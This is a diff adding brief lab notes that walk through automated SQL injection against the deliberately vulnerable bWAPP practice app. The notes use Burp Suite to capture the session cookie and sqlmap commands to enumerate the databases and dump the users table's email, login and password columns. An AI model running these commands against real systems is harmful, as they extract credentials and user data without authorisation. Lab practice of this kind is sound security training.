@@ -1,0 +1,11 @@
+SQL injection automated
+Open bwapp login as bee & bug
+From dropdown select SQL injection (login form) & click on hack
+Goto burpsuit turn on intercept
+Goto browser login as bee & bug
+Open root kali terminal enter sqlmap -u "url" --dbs --batch
+sqlmap -u "url" --cookie "copy from burpsite" --data= "login=bee&password=bug&form=submit" --dbs --batch
+sqlmap -u "url" --cookie "copy from burpsite" --data= "login=bee&password=bug&form=submit" --current-db
+sqlmap -u "url" --cookie "copy from burpsite" --data= "login=bee&password=bug&form=submit" --dbs --dump --batch
+sqlmap -u "url" --cookie "copy from burpsite" --data= "login=bee&password=bug&form=submit" -D bwapp -T users --column --batch
+sqlmap -u "url" --cookie "copy from burpsite" --data= "login=bee&password=bug&form=submit" -D bwapp -T users -C email,login,password --dump
